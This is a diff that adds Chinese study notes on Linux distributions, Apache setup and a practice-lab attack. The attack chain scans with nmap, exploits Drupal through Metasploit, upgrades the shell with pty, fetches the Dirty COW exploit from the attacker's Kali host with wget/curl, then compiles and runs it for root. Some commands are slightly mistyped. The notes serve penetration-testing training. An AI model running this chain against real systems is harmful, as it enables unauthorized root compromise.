@@ -1,1 +1,80 @@
-1.linux发行版本：占用资源少
+一.linux补充
+1.linux发行版本：占用资源少;
+ Centos 网站运维;
+ Ubuntu 开发人员;
+ kali 安全人员;
+2.linux 内核：
+ 稳定版和开发版  由三组数字组成：
+ 第一组数字：目前发布的内核主版本；
+ 第二组数字：偶数代表稳定版本，奇数代表开发中；
+ 第三组数字：错误修补次数；
+  其中一项重要的信息：目标主机操作系统版本；
+    cat/etc/issue
+    cat/etc/*-release
+   查看内核版本：
+    uname -a
+
+二.linux-web端点：
+  1.开启kali-apache
+      默认有: apache 80(http)
+      开启apache  /etc/initd/apache2 start
+      查看运行状态 server apache2 status
+      开机自启动 update -rcd -f apache2 defaults
+      看ip ifconfig;
+  2.开启Ubuntu-apache
+     (1)apt update
+     (2)获得root权限并下载 apt install apache2
+     (3)systemctl status apache2
+     (4)update -rcd -f apache2 defaults
+    要解析php代码要下载php：
+      apt-get install php libapache2 -mod -php
+    重启apache2即可运行php文件
+      systemctl  restart apache2
+
+三：linux提权
+  前提条件也是拿到shell
+  脏牛漏洞
+    本地提权漏洞   版本高于4.8用2.0  低于用1.0
+    原理：（条件竞争类似腾讯文档）
+
+四：攻击步骤：
+  1.nmap  192.168.157.0/24          .1是网关   .254是网卡
+  2.nmap 扫剩下不确定的 -p    看端口情况
+  3.判断网站(80   443)
+  4.信息收集:是drupal
+     看cms框架去找相关漏洞，(1)网上找
+     (2)msf看：
+        kali:msfconsole
+        搜索可以利用的漏洞 search drupal
+        排查看哪个漏洞可以利用
+        use 对应漏洞exp
+        漏洞查看配置 show options
+        设置好地址和端口 set rhost    set rsport
+        run
+        shell /ls
+  5.进入shell 用python命令进入交互
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    whoami看权限
+  6.uname -a 看版本号选择脏牛版本；
+  7.放进自己的kali中:
+    chmod 777 dirty-cpp 提脏牛权限;
+  8.(1)传到kali的www中
+    mv /home/kali/Desktop/dirty.cpp /var/www/html/dirty.cpp
+    (2)msf会话切换目录，下载kali上的脏牛脚本
+     cd /tmp 空间大
+      wget http://192.168.157.129 (kali地址)/dirty.cpp
+      或者: curl http://192.168.157.129 (kali地址)/dirty.cpp
+  9.编译脚本(cpp执行不了需要编译)
+  g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dirty.cpp -lutil
+  10.执行:
+  chmod +x dcow
+  ./dcow -s
+  whoami
+
+三、靶场实验收尾规范（好习惯，贴近正规渗透收尾）
+实验结束删除靶机 /tmp 下 dcow、dirty.cpp 文件，清理上传恶意文件；
+Kali 关闭 apache 服务：systemctl stop apache2；
+不留任何后门、新增用户，恢复靶机原始状态。
+  
+   
+
